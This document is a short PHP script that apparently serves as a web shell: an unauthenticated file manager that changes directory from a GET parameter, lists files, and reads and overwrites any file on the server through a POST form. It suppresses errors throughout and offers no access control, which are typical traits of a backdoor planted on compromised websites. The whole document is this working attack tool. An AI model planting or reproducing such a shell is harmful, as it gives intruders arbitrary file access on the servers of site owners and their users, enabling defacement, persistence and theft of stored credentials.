<?php 
@define('SEP', '/');
function pwd() {
	$pwd = @str_replace('\\', '/', @getcwd());
	return $pwd;
}
function cwd() {
	$cwd = @explode('/', pwd());
	foreach ($cwd as $key => $index) {
		print("<a href='?dir=");
		for ($i=0; $i <= $key ; $i++) {
			print($cwd[$i]);
			if ($i != $key) {
				print("/");
			}
		} print("'>".$index."</a>/");
	}
}
function scdir() {
	$scdir = @scandir(@pwd());
	return $scdir;
}
function alert_success($message) {
	?><script>window.location='<?php print $message ?>';</script><?php
}
function edit($filename) {
	if (isset($_POST['edit'])) {
		if (@file_put_contents($filename, $_POST['edit'])) {
			$nb = "Success";
		} else {
			$nb = "Failed";
		}
	} $text = @htmlspecialchars(@file_get_contents($filename));
	?>
	<center>
		<h4>Filename : <?php print $filename ?></h4>
		<form method="post">
			<textarea name="edit"><?php print $text ?></textarea><br>
			<input type="submit">
		</form>
	</center>
	<?php
	die($nb);
}
function delete($filename) {
	if (@file_exists($filename)) {
		if (@unlink($filename)) {
			@alert_success("?dir=".@pwd()."");
		} else {
			print("Failed");
		}
	}
}
if (isset($_GET['dir'])) {
	@chdir($_GET['dir']);
}
if (@$_GET['action'] == 'edit' and isset($_GET['files'])) {
	@edit($_GET['files']);
}
cwd();
?>
<table>
	<tr>
		<th>Filename</th>
	</tr>
<?php
foreach (@scdir() as $dir) {
	if(!is_dir($dir)) continue;
	if ($dir === '.') {
		$act = "<center>--</center>";
	} elseif ($dir === '..') {
		$act = "<center>--</center>";
	}
	print("<tr><td>");
	print("<a href='?dir=".@pwd().SEP.$dir."'>".$dir."</a></td>");
}
foreach (@scdir() as $file) {
	if(!is_file($file)) continue;
	$tools = "<center>--</center>";
	print("<tr><td>");
	print("<a href='?action=edit&dir=".@pwd()."&files=".$file."'>".$file."</a></td>");
}
